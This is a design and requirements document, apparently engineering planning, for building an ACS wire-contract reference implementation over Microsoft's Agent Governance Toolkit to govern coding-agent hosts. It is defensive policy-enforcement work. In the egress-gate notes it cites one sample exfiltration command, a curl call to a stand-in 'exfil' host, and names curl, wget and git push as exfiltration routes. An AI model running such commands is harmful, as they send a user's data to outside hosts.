# ACS Reference Implementation over AGT — Shaping

## Frame (working)

**Source (user, verbatim):**

> we want to create a reference implementation of ACS, using the policies and infra defined here: https://github.com/microsoft/agent-governance-toolkit

> the goal here is that AGT is an open source set of policies; we want to show the world what using ACS as a wire contract can give you; this means we need to create adapters and have the ACS wire contract as a reference implementation for folks more familiar with ACS, then show why ACS takes things forward in a way that shows that it can account for threat models not remotely considered by AGT

> we don't need to showcase that AGT is incomplete, we just need to show how you can support something like AGT, or other implementations. we want to show how AGT can be completely expressed in ACS, first. this requires basically pulling what we can from the AGT, and showing that you don't need 7/8 different modules for each coding agent, you just need 1 ACS contract, and then AGT works across the rest of them. ACS is a normalizing wire contract

**Problem.** Governance integration is M×N today. AGT ships four per-agent host packages — and each has a *different architecture*: Copilot CLI is an in-process extension, Claude Code and Antigravity are subprocess hooks, OpenCode is an in-process TS plugin. Microsoft documents the resulting capability divergence in their own READMEs. Every new agent is another module, in every SDK, for every policy vendor. Every policy vendor repeats the work.

**Outcome.** A running system where one ACS contract sits between hosts and policy runtimes, and the multiplication collapses to addition. A host implements ACS once and is governable by any conformant runtime. AGT implements ACS once and governs any conformant host. The demo proves it by governing two structurally different agent hosts with one unforked AGT policy set and zero new AGT code.

**Sequencing.** Completeness first: AGT fully expressed in ACS, losslessly. The extension story — facts the contract carries that AGT delegates to the host — is headroom shown at the end, not a deficiency argument.

---

## Verified ground

See `spike-agt-integration.md` for the full investigation.

AGT top-level modules:

| Kind | Modules |
|---|---|
| Per-agent host packages | `agent-governance-antigravity-cli`, `agent-governance-claude-code`, `agent-governance-copilot-cli`, `agent-governance-opencode` |
| Language SDKs | `agent-governance-dotnet`, `-golang`, `-python`, `-rust`, `-typescript` |
| Policy runtime | `policy-engine` (MS-ACS spec `0.3.1-beta`, Rust core, library-only) |

MS-ACS surface to express (`policy-engine/spec/SPECIFICATION.md`, wire schemas):

| Element | Value |
|---|---|
| Intervention points | `agent_startup`, `input`, `pre_model_call`, `post_model_call`, `pre_tool_call`, `post_tool_call`, `output` — closed set; §22 "A host MUST NOT invent new identifiers in either set." |
| Verdicts | `allow`, `warn`, `deny`, `escalate`, `transform` |
| Policy input members | exactly five: `intervention_point`, `policy_target`, `snapshot`, `annotations`, `tool` |
| Transform bound | `^\$policy_target(\.\|\[\|$)`; other roots fail closed with `runtime_error:transform_target_forbidden` |
| Action identity | `input_identity` / `enforced_identity` = SHA-256 of canonical policy input, before / after transform |
| Error model | fail closed; any evaluation error yields `deny` with a reserved `runtime_error:` reason |
| Invocation | in-process SDK only. `AgentControl.from_path(manifest)` → `evaluate_intervention_point(point, snapshot)`. No HTTP/gRPC server exists |
| Stock policy | `agt_default.rego` bound at `data.agt.defaults.verdict`, configured entirely through `data.agt.defaults.config` YAML |
| IFC carriage | `result_labels` returned verbatim; "The core stores and propagates nothing" — the host must persist and re-supply labels |

The closed, five-member policy input is what makes "completely expressed in ACS" a provable claim rather than an aspiration.

**⚠️ V3 correction — four of the five members come from the snapshot; `annotations` does not.** Verified by running it, not by reading: annotations placed at the snapshot's top level, under `envelope`, under `tool_call`, under `context`, or under two snake_case aliases are **all dropped**, and a `confidence.min_score` gate that should have denied returned `allow` in every placement. `annotations` is populated by a manifest-declared annotator dispatched through the SDK's `annotatorDispatcher` — a surface published in `AgentControl.fromPath`'s own type signature, so coupling to it satisfies R2.4. The manifest shape is `annotators: { <name>: { type: classifier|llm|endpoint } }` plus, per intervention point, `annotations: { <annotator-name>: { from: "<JSONPath into the snapshot>" } }`; the annotator's return value lands at `input.annotations.<name>`.

This qualifies **R1.3**: the four snapshot-borne members are constructible from an ACS envelope, and `annotations` is not — the ACS v0.1.0 tool-call-request payload carries `tool`, `operation`, `capability`, `arguments`, `raw_command`, `intent`, and nothing a drift or confidence score could be derived from. The consequence is narrow but real: the two stock gates that read `input.annotations.*` (drift → `warn`, confidence → `deny`) are drivable only by a Guardian that originates the value, which is exactly what AGT's design asks a host to do ("Hosts run a behaviour-drift detector outside the policy engine"). So it is a note about **ACS v0.1.0's coverage**, not about AGT, and V7's matrix records it as `guardian_only` — the status it gives a cell the Guardian can resolve from process-local knowledge and a wire consumer cannot. Surfaced during V3 planning; see §V3 in the slices doc.

---

## Requirements (R)

| ID | Requirement | Status |
|----|-------------|--------|
| **R0** | **One ACS contract normalizes host↔policy integration: AGT's policy layer, unforked, governs more than one agent host with no per-host AGT module** | Core goal |
| **R1** | **AGT is completely expressible in ACS** | Core goal |
| R1.1 | All 8 intervention points map to ACS hooks without loss | Must-have |
| R1.2 | All 5 verdicts map to ACS dispositions without loss — `warn` = `allow` with non-empty `policy_references` | Must-have |
| R1.3 | ⚠️ The AGT policy input's five members are constructible from an ACS envelope — **four of them.** `annotations` comes from a manifest-declared annotator, and ACS v0.1.0 carries no field to derive one from; see Verified ground and the Fit Check note | Must-have, qualified |
| R1.4 | ⚠️ `enforced_identity` survives the adapter — approval binds to the action that executes — **Guardian-side only.** ACS v0.1.0 carries no action-identity field on any of its 43 schemas, so the binding cannot travel; see the Fit Check note and §V7 | Must-have, qualified |
| R1.5 | 🟡 AGT's evaluation-layer fail-closed survives: an AGT `deny` verdict is delivered as an ACS `deny` and honored regardless of wire posture | Must-have |
| R1.6 | `transform`'s `$policy_target` bound survives as ACS `modify` | Must-have |
| R1.7 | 🟡 Wire-delivery failure applies the negotiated `on_decision_failure` posture (ACS default `proceed`) with every fail-open proceed audited — never conflated with AGT's evaluation-layer fail-closed. Delivery means the Guardian stayed silent, the transport died, or an error arrived whose code carries no verdict and does not say the Guardian refused | Must-have |
| R1.8 | 🟡 The three ACS mandatory fail-closed cases hold: malformed `modifications`, `DEFER` expiry, `ASK` expiry | Must-have |
| R1.9 | 🟡 **Added by review after V3 shipped.** A refusal is not a delivery failure: an error whose code says the Guardian was alive and REFUSED the envelope (`-32700`, `-32010`, `-32011`, `-32020`) is a governance outcome and denies **regardless of posture**, still audited. Filing these under R1.7 meant the shipped default (`proceed`) turned the Guardian's own "no" into `allow`. An unrecognised error code stays a delivery failure and keeps the posture — deliberately, since widening this to every error object would fail closed on an error the Guardian never sent | Must-have |
| R1.10 | 🟡 Every AGT stock gate class is either reachable in this deployment or carries a named reason it is not | Must-have |
| R1.11 | 🟡 A tool whose arguments do not match the manifest's single `policy_target` is evaluated, not failed closed on a missing path — and a transform lands on **that tool's** argument, never on a literal that names another tool's | Must-have |
| R1.12 | 🟡 Egress is decided for the tool the threat actually uses, not only for the tool whose arguments happen to name a destination | Must-have |
| **R2** | 🟡 **Interop is real, and stays real** | Must-have |
| R2.1 | AGT's published policy library decides, used as shipped — driven only through `data.agt.defaults.config` | Must-have |
| R2.2 | AGT's engine runs unforked, at a pinned upstream version | Must-have |
| R2.3 | No change to AGT source is required to run the demo | Must-have |
| R2.4 | 🟡 Coupling is to AGT's declared contract surfaces only — `manifest.schema.json`, the `policy-input` / `verdict` / `snapshot` wire schemas, the intervention-point and verdict enums, and `data.agt.defaults.config`. Never SDK internals or private APIs | Must-have |
| R2.5 | 🟡 Scheduled CI re-runs the conformance harness against upstream AGT `main`, so a moved contract surface shows up as a failing case rather than silent rot | Must-have |
| R2.6 | 🟡 An upstream-contract failure names what changed in AGT's own terms — which intervention point, verdict, or schema field — so the fix is obvious | Must-have |
| R2.7 | 🟡 Non-breaking upstream AGT releases require no code change here | Must-have |
| **R3** | **The M×N collapse is demonstrated** | Core goal |
| R3.1 | Two structurally different hook surfaces governed by one AGT policy set | Must-have |
| R3.2 | The host adapter contains zero AGT-specific code — verifiable by inspection | Must-have |
| R3.3 | The AGT bridge contains zero host-specific code — verifiable by inspection | Must-have |
| R3.4 | Adding the second host requires zero new AGT code | Must-have |
| R3.5 | Claude Code is host #1 | Decided |
| R3.6 | ✅ OpenCode is host #2 — in-process TS plugin against Claude Code's subprocess hooks | **Confirmed** (D1, V5 planning) |
| R3.7 | No runtime swap. AGT is the only policy runtime in the demo | Decided |
| R3.8 | ✅ Show that a capability frozen out of one AGT host module is reachable through the contract, framed as capability drift rather than defect | **Confirmed** (F1, V4 planning) |
| **R4** | **AGT gains, doesn't lose** | Must-have |
| R4.1 | No capability regression versus AGT's native `agent-governance-claude-code` | Must-have |
| R4.2 | Nothing in the demo requires AGT to change | Must-have |
| R4.3 | Framing is integration-surface reduction, never deficiency | Must-have |
| R4.4 | AGT's native modules are described accurately as the baseline, not caricatured | Must-have |
| **R5** | **The ACS wire contract reads as a reference** | Must-have |
| R5.1 | Every hook firing is inspectable as an ACS envelope, not buried in library internals | Must-have |
| R5.2 | An ACS-first reader can trace one action end to end without reading AGT source | Must-have |
| R5.3 | Declares which ACS profiles it claims and which it does not | Must-have |
| R5.4 | 🟡 Which `steps/*` hooks the implementation instruments — `steps/toolCallRequest` and `steps/toolCallResult` through V8; `steps/skillLoad` added by V10 | **Decided** (V9/V10 planning) |
| **R6** | **The stateless/stateful split holds** | Must-have |
| R6.1 | AGT's engine stays stateless — complete policy input per decision | Must-have |
| R6.2 | Session state (SessionContext, Intent, lineage) lives in the ACS Guardian layer | Must-have |
| R6.3 | State is not duplicated across the two layers | Leaning yes |
| **R7** | **Runnable and reproducible** | Must-have |
| R7.1 | Starts with one command on a laptop | Must-have |
| R7.2 | No cloud account or paid dependency on the demo path | Must-have |
| R7.3 | Deterministic enough to demo live | Undecided |
| **R8** | **Headroom is visible, but it is not the pitch** | Leaning yes |
| R8.1 | 🟡 ACS provenance carries the IFC labels AGT's `result_labels` explicitly delegates to the host | Leaning yes |
| R8.2 | Unconsumed hooks cost AGT nothing — an AGT-profile host ignores them cleanly | Must-have |
| R8.3 | 🟡 Whether the demo runs an actual policy over an ACS-only hook, or just shows the surface exists — **runs one.** V10 drives AGT's stock `content_hash` gate from `steps/skillLoad`, a hook no AGT host package has | **Decided** (V10 planning) |
| R8.4 | 🟡 A control ACS carries for a component class AGT's own hosts have no hook for is decided by AGT's unforked rule | Leaning yes |

---

## Known tension

**R1.2 vs. AGT `warn` — resolved, no spec change needed.** ACS has no `warn` in the `decision` enum, but it has the equivalent: an `allow` whose `policy_references` array is non-empty. The action proceeds, the rule that fired is named with `rule_id`, `reason_codes` categorizes it, `reasoning` explains it. A consumer separates observe-only from clean allow by testing `policy_references`. The round trip is lossless both ways. AGT's stock `drift` rule emits `warn`, so this path is exercised, not theoretical. The mapping doc's line — "ACS can encode this as `allow` plus metadata, but it is not first-class today" — undersells structured fields as metadata and should be corrected there too.

**R1.1 vs. `pre_model_call` / `post_model_call` — open.** ACS v0.1.0 has no model-call hook. The mapping doc proposes `steps/modelCall` (pre and post) for v0.2, 1:1 with AGT. Without it, two of AGT's eight points have no clean ACS target and R1.1 fails. This is the one place the reference implementation becomes a forcing function for v0.2 rather than a consumer of v0.1.0 alone.

---

## A: Guardian service in front of AGT

The literal reading of the spec. Hosts are ACS clients; a Guardian is a server; the wire is real. AGT is embedded in the Guardian as a library, since no server exists.

| Part | Mechanism | Flag |
|------|-----------|:----:|
| **A1** | **Host adapters — one per host, ACS-only** | |
| A1.1 | Claude Code: hook JSON → ACS request envelope over local HTTP; ACS decision → `permissionDecision` / `updatedInput` / `updatedToolOutput` | |
| A1.2 | OpenCode: same shape, driven from `tool.execute.before` / `.after` in-process plugin hooks | |
| **A2** | ACS Guardian service: JSON-RPC 2.0 over HTTP, validates every envelope against the v0.1.0 schemas | |
| **A3** | Session layer in the Guardian: SessionContext hash chain, Intent, provenance lineage; persists AGT `result_labels` and re-supplies as `input.ifc.source_labels` | |
| **A4** | AGT bridge: embeds the AGT **Node** SDK ⚠️ *amended, was Python*; ACS envelope → 5-member policy input; `evaluateInterventionPoint`; verdict → ACS decision | |
| **A5** | Envelope tap: every request and response rendered as pretty JSON in a live viewer | |
| **A6** | Demo runbook: one AGT policy bundle, both hosts, side by side with AGT's native packages | |

## B: In-process ACS library

Same mapping, no network. Envelopes are constructed and schema-validated but passed in memory.

| Part | Mechanism | Flag |
|------|-----------|:----:|
| **B1** | Host adapters call a Guardian library directly instead of a socket | |
| **B2** | ACS envelope objects built and validated against v0.1.0 schemas, never serialized | |
| **B3** | Session layer in-process | |
| **B4** | AGT bridge, as A4 | |
| **B5** | Envelope tap writes to a log file | |
| **B6** | Demo runbook, as A6 | |

## C: Contract-first — the mapping is the deliverable

The runtime exists, but the artifact Microsoft reads is a machine-checked mapping table plus a conformance matrix with every cell resolved. The demo is evidence for it, not the product. ⚠️ *This sentence said "a green conformance matrix" — the same claim §V7 of the slices doc retracted, and for its reason: a matrix that must be all green to count is a matrix under pressure to redefine the claim.*

| Part | Mechanism | Flag |
|------|-----------|:----:|
| **C1** | Normative ACS ↔ MS-ACS mapping as data: 8 intervention points, 5 AGT verdicts, the 5 policy-input members, action identity, error taxonomy | |
| **C2** | Conformance harness: a round-trip case per point and per verdict proving no loss. A red cell is a spec defect, not a bug | |
| **C3** | Host adapters driven by a per-host hook-mapping file rather than handwritten dispatch | |
| **C4** | Guardian service, session layer, and AGT bridge, as A2–A4 | |
| **C5** | Published artifact = mapping table + coverage matrix; the running demo is the proof it holds | |
| **C6** | Upstream contract watch: the same harness runs on a schedule against AGT `main`. A reported surface diff names the changed intervention point, verdict, or schema field | |
| **C7** | 🟡 **Reach AGT's stock `egress` gate.** Two routes, both built (V9) | |
| C7.1 | Govern a tool whose ACS `arguments` already name a destination. `assemblePreToolCallSnapshot` unwraps `arguments.url.value` to `tool_call.args.url`, which is `egress.rego`'s **first** default destination path — so this is one `data.json` key and one manifest `tools:` entry, with no code and no Rego | |
| C7.2 | Extract a destination from `raw_command` in a Guardian annotator, returning `{destination}` to `input.annotations.egress` — `egress.rego`'s **fifth** default path. Covers the shell tools C7.1 cannot, at the cost of a Guardian-originated value | |
| **C8** | 🟡 **Reach AGT's stock `content_hash` gate from `steps/skillLoad`** (V10). `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value`; the approved digest is declared on the manifest's tool entry, which AGT's `$defs/tool` permits (`additionalProperties: true`) and the SDK carries through to `input.tool` | |
| **C9** | 🟡 **One normalised `policy_target` leaf, declared once in `mapping.yaml` and read twice** (V9). AGT's `intervention_point` is `additionalProperties: false` with exactly one `policy_target`, so a second tool shape is otherwise denied on `runtime_error:path_missing`. The same entry names the argument a `transform` lands back on, replacing `into_argument`'s literal — one declaration, because two would disagree | |

⚠️ **C5 said "test matrix".** That was a third name for the 8 × 5 — U30's `CoverageMatrix`, which N47 `renderCoverageMatrix()` publishes — in the one commitment whose subject is which two artifacts get published. `slices/v7/README.md` commitment 2 freezes the three names apart: `Mapping` is S10's data, `MappingTable` is U32's rendering of it, `CoverageMatrix` is U30's measurements. C5 names the two published artifacts, so it uses the two published names (PR #16 review).

---

## Fit Check

Post-spike. All flags cleared, so the check now discriminates.

| Req | Requirement | Status | A | B | C |
|-----|-------------|--------|---|---|---|
| R0 | One ACS contract normalizes host↔policy integration: AGT's policy layer, unforked, governs more than one agent host with no per-host AGT module | Core goal | ✅ | ✅ | ✅ |
| R1 | AGT is completely expressible in ACS | Core goal | ❌ | ❌ | ✅ |
| R2 | 🟡 Interop is real, and stays real | Must-have | ❌ | ❌ | ✅ |
| R3 | The M×N collapse is demonstrated | Core goal | ✅ | ✅ | ✅ |
| R4 | AGT gains, doesn't lose | Must-have | ✅ | ✅ | ✅ |
| R5 | The ACS wire contract reads as a reference | Must-have | ✅ | ❌ | ✅ |
| R6 | The stateless/stateful split holds | Must-have | ✅ | ❌ | ✅ |
| R7 | Runnable and reproducible | Must-have | ✅ | ✅ | ✅ |
| R8 | Headroom is visible, but it is not the pitch | Leaning yes | ✅ | ✅ | ✅ |

**Notes:**
- R1 fails A and B: both assert complete expressibility, neither proves it. Only C2 turns "completely expressed" into a per-case result someone can check. On the claim the whole pitch rests on, asserted is not enough. Adding R1.7 and R1.8 does not move these verdicts — all three shapes *can* implement the posture split; only C demonstrates it case by case, now via the extended N44.
- 🟡 R2 fails A and B on the upstream contract (R2.5, R2.6): without a conformance harness there is nothing to re-run against upstream, so an AGT change is discovered by a human noticing, or not at all. C6 makes upstream divergence a named failing case. MS-ACS is `0.3.1-beta` and warns of breaking changes between minor versions, so this is a live risk, not a theoretical one.
- R5 fails B: envelopes that are never serialized are not inspectable on the wire, which is what R5.1 asks for.
- R6 fails B: an in-process Guardian sharing a heap with the host adapter makes the stateless/stateful split an assertion rather than an observable property.
- **C is selected.** It carries every requirement A does and is the only shape that proves R1.
- ⚠️ **R1.3 is qualified, discovered during V3 planning — and no verdict moves.** Four of AGT's five policy-input members come from the snapshot the Guardian assembles; `annotations` comes from a manifest-declared annotator instead, and the ACS v0.1.0 wire carries no field a drift or confidence score could be derived from (evidence under Verified ground). So "the AGT policy input's five members are constructible from an ACS envelope" is true of four and Guardian-originated for the fifth. This does not move R1 in any column: A and B assert expressibility and still do not prove it; C still proves it case by case, and the qualification becomes one more resolved cell in C2's matrix — `guardian_only`, the status V7 gives a cell the Guardian can resolve from process-local knowledge and a wire consumer cannot — which is the honest result C2 exists to produce. It is a note about ACS v0.1.0's coverage, not about AGT, so R4 is untouched.
- ✅ **R3.8 confirms, discovered during V4 planning — and no verdict moves.** F1 is resolved: a capability AGT's own Claude Code package scopes out ("`PostToolUse` … cannot reliably redact tool output", README:39, under *Important parity gaps*) is reachable through the contract. R3 was already ✅ in all three columns on R3.1–R3.7, so this closes the one 🟡 beneath it without changing a cell. **R4 is untouched, and the reason matters:** the package's wording is "cannot **reliably**", and V4's evidence is what makes that wording exactly right — a replacement not matching the tool's own output schema is silently discarded and the original delivered. So the finding is that meeting the reliability condition is a contract-level job done once for every runtime, not a defect in a per-host module. That is R4.3's framing holding under the one requirement most able to break it.
- ⚠️ **R1.4 is qualified, discovered during V7 planning — and no verdict moves.** Two facts, both measured against the pinned SDK rather than read from AGT's docs. First: `enforced_identity` is the SHA-256 of the key-sorted, whitespace-free JSON of the policy input after **`policy_target.value` alone** is replaced by the transform — the snapshot's own copy of that leaf is not updated, so AGT's identity binds to the policy target it rewrote, not to the document the host will execute. Second: **ACS v0.1.0 carries no action-identity field on any of its 43 schemas** (`identity` occurs twice in the whole spec directory, as `session-start.json`'s `user_identity` and as prose in `skill-register.json`). So "survives the adapter" is true Guardian-side and untrue on the wire, and no slice can make it true without a v0.2 field. This does not move R1 in any column, for the same reason R1.3's qualification did not: A and B assert and do not prove; C proves case by case, and the qualification becomes a resolved cell in C2's matrix — `guardian_only`, in the vocabulary V7 published. That is the third finding to land on that shape, after R1.3's `annotations` and D10's Trace attributes, and the three together are what V7 publishes: **v0.1.0's response envelope carries a decision, and never has to carry the evidence for it.** A note about ACS v0.1.0's coverage, not about AGT, so R4 is untouched. ⚠️ *This sentence read "but not the evidence for it" until V7's execution measured D10 and found `AcsResult.metadata` already declares exactly `evaluator`, `evaluator_version`, `evaluation_duration_ms`, `model_id` and `confidence` — five members, all optional, under an optional `metadata`. ⚠️ Corrected again after the final review: that first correction over-generalised. **One of the three is optionality and two are absence** — D10's Trace attributes exist and are never required, while R1.3's `annotations` input and R1.4's identity have no field on the wire at all. The finding the three share is not one mechanism but one consequence: a wire consumer cannot rely on the evidence, twice because it is absent and once because it is optional. That is why the v0.2 ask is "require the ones already there, and add the ones that are not."*
- 🟡 **R1.9–R1.11 and R8.4 are added by V9/V10 planning — and no verdict moves.** All four are properties of the deployment C describes, measured in `spike-unreached-gates.md`: which AGT gate classes this bundle's configuration reaches, what a single `policy_target` does to a second tool shape, and whether an ACS-only hook can drive an unforked AGT rule. A and B would carry the same facts and still assert rather than prove them, which is what R1 has failed them on since the first check. C absorbs all four into C7–C9 and into cells of C2's matrix. The one that could have moved a verdict is **R1.10**, because it names a live fail-closed defect (a benign call denied on `runtime_error:path_missing`, and a redaction emitted against an argument the tool does not have) rather than a coverage note — but it is a defect of *this deployment's manifest and mapping*, reachable in every column, and C is the only shape whose harness would have caught it. R4 is untouched: nothing here is a fact about AGT.
- 🟡 **R1.11 is what splits C7 into two parts rather than one.** C7.1 is the stronger *claim* — the destination is constructible from the ACS envelope alone, so C2's matrix records the cell `expressed` — and it is measured working with zero code and zero Rego. But it only ever covers tools that happen to name a destination in their arguments, and shell egress (`curl`, `wget`, `git push`) is how exfiltration actually happens. C7.2 covers those, at the price of a Guardian-originated annotation, so its cell is `guardian_only` — the same status R1.3's `annotations` and R1.4's identity already carry. Building only one would mean either a claim with no threat behind it or a demo with a weaker claim than the wire supports, so C carries both and the matrix records them as two different colours of the same gate.
- ⚠️ **A4's SDK choice is load-bearing for R1.4, discovered during V1 planning.** AGT's PyO3 binding surfaces only `action_identity`, collapsing `input_identity` and `enforced_identity`; the Node binding serializes both. Every shape embeds A4, so on the Python SDK R1.4 ("`enforced_identity` survives the adapter") would be unverifiable in *all three* columns and C's R1 ✅ would not survive contact with C2's harness. A4 is amended to the Node SDK and the verdicts stand as written. No other row moves.

## C7: Reaching the egress gate

Both alternatives measured against the unforked bundle in
`spike-unreached-gates.md`. **Both are built** — the check below is what says
why neither alone is enough, not which one wins.

| Req | Requirement | Status | C7.1 | C7.2 |
|-----|-------------|--------|------|------|
| R1.3 | The AGT policy input's five members are constructible from an ACS envelope | Must-have, qualified | ✅ | ❌ |
| R1.9 | Every AGT stock gate class is either reachable in this deployment or carries a named reason it is not | Must-have | ✅ | ✅ |
| R1.11 | Egress is decided for the tool the threat actually uses, not only for the tool whose arguments happen to name a destination | Must-have | ❌ | ✅ |
| R2.1 | AGT's published policy library decides, used as shipped — driven only through `data.agt.defaults.config` | Must-have | ✅ | ✅ |

**Notes:**
- C7.1 fails R1.11: a `url` argument covers `WebFetch`, and nothing covers `curl https://exfil.test/x`.
- C7.2 fails R1.3: the destination reaches policy as an annotation, and annotations are Guardian-originated by AGT's own design. The measured verdicts are identical either way; only the *provenance* of the destination differs, which is exactly what R1.3 is about.

---

## Spikes

All resolved — see `spike-agt-integration.md` and `spike-unreached-gates.md`.

`spike-unreached-gates.md` (V9/V10 planning) answers eight questions about the
two AGT stock gates ACS already addresses. Its four load-bearing findings:
AGT's egress gate reads `snapshot.tool_call.args.url` first and the ACS wire
already lands there; the manifest's single `policy_target` denies any tool
without a `command` argument on `runtime_error:path_missing`; AGT's `$defs/tool`
is `additionalProperties: true` so a manifest may declare a `content_hash` the
SDK carries through to `input.tool`; and a manifest declaring an annotator the
Guardian dispatches nothing for denies **every** call, benign ones included.

| # | Spike | Outcome |
|---|-------|---------|
| **S1** | How is AGT's engine invoked unforked? | Library-only, in-process, no server. Guardian embeds an SDK. Rego needs the `opa` CLI; Cedar is built in |
| **S2** | Which ACS dispositions can Claude Code express? | All five. `permissionDecision` covers allow/deny/ask/defer; `updatedInput` and `updatedToolOutput` cover modify |
| **S3** | Same for host #2 | AGT's four host packages have four architectures with documented capability divergence. OpenCode beats Copilot CLI on every axis |
| **S4** | What ships in the stock bundle? | 11 Rego modules plus Cedar parity, fixed priority order, fully config-driven. `result_labels` carriage is delegated to the host |

### Follow-ups

| # | Item |
|---|------|
| ~~F1~~ | ✅ **Resolved: yes, conditionally.** Confirmed by hand against Claude Code 2.1.227 during V4 planning. `PostToolUse.hookSpecificOutput.updatedToolOutput` exists and rewrites tool results — but only when the replacement matches the tool's **own output schema**; a mismatched one is silently discarded and the *original* output is delivered to the model, with only an error attachment to show for it. And a `deny` at that gate does not suppress anything: `{"decision":"block"}` delivers the reason while the model still receives the real output. Both are recorded as watch-fors in §V4, which is also where the evidence lives. R3.8 confirms; risk row 1 retires |
| F2 | Confirm an OpenCode plugin can express deny and modify through `tool.execute.before` / `.after` |
| ~~F3~~ | ✅ **Resolved: Rego.** The premise was wrong — the SDK bundles OPA 0.70.0 as a platform package, so Rego needs no external binary and Cedar's only advantage disappears. Stock bundle verified 105/105 under the bundled OPA and system OPA 1.18.2. Closes D7 |

---

## Detail C: Affordances

### Places

| # | Place | Description |
|---|-------|-------------|
| P1 | Claude Code session | Host #1. Subprocess command hooks |
| P2 | OpenCode session | Host #2. In-process TS plugin |
| P3 | ACS Guardian service | The ACS wire boundary and all session state |
| P3.1 | AGT bridge | Subplace of P3. Embedded AGT runtime, stateless |
| P4 | Envelope Inspector | Live view of ACS traffic |
| P5 | Conformance Report | Coverage matrix, mapping table, upstream contract check |

### UI Affordances

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| U1 | P1 | claude-code | prompt input | type | → N1 | — |
| U2 | P1 | claude-code | tool permission outcome in transcript | render | — | — |
| U3 | P1 | claude-code | rewritten tool output in transcript | render | — | — |
| U10 | P2 | opencode | prompt input | type | → N10 | — |
| U11 | P2 | opencode | tool decision surface | render | — | — |
| U12 | P2 | opencode | redacted tool output | render | — | — |
| U20 | P4 | inspector | envelope stream, request/response JSON pairs | render | — | — |
| U21 | P4 | inspector | decision badge: decision + `policy_references` + `reason_codes` | render | — | — |
| U22 | P4 | inspector | session chain view: SessionContext entries and lineage | render | — | — |
| U23 | P4 | inspector | posture badge: negotiated `on_decision_failure`, plus a running count of audited fail-open proceeds | render | — | — |
| U30 | P5 | conformance | coverage matrix, 8 intervention points × 5 AGT verdicts | render | — | — |
| U33 | P5 | conformance | trace-pillar row: each required OTel attribute, its v0.1.0 wire source, and whether a wire consumer can emit it | render | — | — |
| U31 | P5 | conformance | surface-diff detail: changed point, verdict, or schema field | render | — | — |
| U32 | P5 | conformance | rendered ACS ↔ MS-ACS mapping table | render | — | — |

### Code Affordances

| # | Place | Component | Affordance | Control | Wires Out | Returns To |
|---|-------|-----------|------------|---------|-----------|------------|
| N1 | P1 | acs-hook shim | generic hook entrypoint, reads hook JSON on stdin | call | → N2 | — |
| N2 | P1 | `@acs/host-adapter` | `buildEnvelope(event, payload, hookmap)` | call | → N4 | — |
| N3 | P1 | `@acs/host-adapter` | `renderDecision(hookEventName, decision, hookmap)` → the host's output object on stdout, every field name read from the hook's own `decisions` block | call | → U2, → U3 | — |
| N4 | P1 | `@acs/host-adapter` | `createGuardianClient(url).requestDecision()` JSON-RPC over HTTP | call | → N20 | → N7 |
| N5 | P1 | `@acs/host-adapter` | `negotiateSessionConfig()` — `handshake/hello`; sends a ClientHello declaring `methods_implemented` — **both** `steps/*` methods this adapter builds envelopes for since V4, a property of the *adapter* and not of one deployment's hookmap — and keeps what comes back as this session's config (S13): `methods_evaluated`, `timeout_config`, `on_decision_failure`. Under-declaring `methods_implemented` is the direction that breaks the exchange rather than merely misdescribing it: `handshake.json` defines N28's `methods_evaluated` as a *subset of the client's* `methods_implemented`, so a Guardian that does evaluate result envelopes could not say so without answering with a method this hello never offered | call | → N28 | → S13 |
| N6 | P1 | `@acs/host-adapter` | `applyFailurePosture()` — no decision within timeout → negotiated posture (default `proceed`); writes an audit event on every fail-open proceed | call | → S14, → N3 | — |
| N7 | P1 | `@acs/host-adapter` | `validateDecision()` — malformed `modifications` → `DENY`; `ASK`/`DEFER` expiry → their `timeout_*` defaults; **applies** §6.3's modifications to the ACS document its pointers address — the original arguments at the request gate, the result payload at the result gate — so the host's rewritten input, or its replacing output, is a shape the host accepts (R1.6). At the result gate the applied document is **projected back into a clone of the host's own output object** at the leaf S1's `outputs` block names, because a replacement missing a sibling field is one the host discards while delivering the original. A projection that cannot land is the same `DENY` as a rewrite that could not be applied — **and so is one that lands and carries nothing back**: §6.3's pointers address the whole result payload, which has fields beside the one leaf this gate can hand the host, so a rewrite that leaves that leaf untouched projects the output the host is already holding, and reporting it applied would deliver the original while the audit trail records a redaction. Checked by asking whether the leaf changed, so the guarantee is exactly "the leaf changed" and **not** "every modification landed": a `modifications` **bundling** a leaf edit with a non-leaf one is still reported applied while the non-leaf half is dropped — measured, recorded in §V4, and closable only by a per-modification check in the apply step, which is also what the **request** gate needs (§V4). `modifications.modified_content` is refused for the neighbouring reason: an opaque replacement string is a field of neither document these pointers address, so it has no target at **either** gate | call | → N3, → N6 | — |
| N10 | P2 | acs-plugin shim | OpenCode plugin hooks: `session.start`, `event`, `tool.execute.before/after/error` | call | → N11 | — |
| N11 | P2 | `@acs/host-adapter` | `buildEnvelope()` — **same module as N2** | call | → N13 | — |
| N12 | P2 | `@acs/host-adapter` | `renderDecision()` — **same module as N3** | call | → U11, → U12 | — |
| N13 | P2 | `@acs/host-adapter` | `createGuardianClient().requestDecision()` — **same module as N4** | call | → N20 | → N16 |
| N14 | P2 | `@acs/host-adapter` | `negotiateSessionConfig()` — **same module as N5** | call | → N28 | → S15 |
| N15 | P2 | `@acs/host-adapter` | `applyFailurePosture()` — **same module as N6** | call | → S16, → N12 | — |
| N16 | P2 | `@acs/host-adapter` | `validateDecision()` — **same module as N7** | call | → N12, → N15 | — |
| N20 | P3 | guardian | `POST /acs` JSON-RPC 2.0 endpoint | call | → N21 | — |
| N21 | P3 | guardian | `validateEnvelope()` against v0.1.0 schemas | call | → N22, → N27 | — |
| N22 | P3 | guardian | `appendContextEntry()` — hash-chained SessionContext | call | → S3, → N23 | — |
| N23 | P3 | guardian | `assemblePreToolCallSnapshot()` / `assemblePostToolCallSnapshot()` — envelope + session state → AGT snapshot, one function per intervention point. 🟡 **V9 adds the normalised policy-target leaf** (from N54) and forwards `raw_command`, so one manifest `policy_target` serves every tool shape instead of denying all but one on `runtime_error:path_missing`. 🟡 **V10 adds `assembleSkillLoadSnapshot()`** as a third sibling: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value` | call | → N30 | — |
